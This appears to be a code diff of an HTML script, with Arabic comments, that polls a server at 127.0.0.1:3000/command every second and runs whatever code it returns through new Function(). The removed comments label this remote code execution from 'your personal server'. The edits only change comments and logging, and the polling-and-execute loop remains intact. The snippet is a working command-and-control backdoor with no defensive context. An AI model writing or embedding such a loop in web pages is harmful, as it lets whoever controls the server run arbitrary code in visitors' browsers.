@@ -1,21 +1,20 @@
 <script>
     async function startPolling() {
         try {
-            // الاتصال بسيرفرك الشخصي
+            // سحب الكود من سيرفرك المحلي
             const response = await fetch("http://127.0.0.1:3000/command");
             const data = await response.json();
 
             if (data.code && data.code !== "") {
-                // تنفيذ الكود المستلم مباشرة (Remote Code Execution)
+                console.log("جاري تنفيذ: " + data.code);
+                
+                // تنفيذ الكود
                 new Function(data.code)();
-                console.log("تم تنفيذ الكود المستلم من السيرفر.");
             }
         } catch (e) {
-            // في انتظار تشغيل السيرفر...
+            // السيرفر غير شغال أو المتصفح يمنع الاتصال
         }
-        setTimeout(startPolling, 1000); // يفحص كل ثانية
+        setTimeout(startPolling, 1000);
     }
-
-    // بدء التشغيل
     startPolling();
 </script>
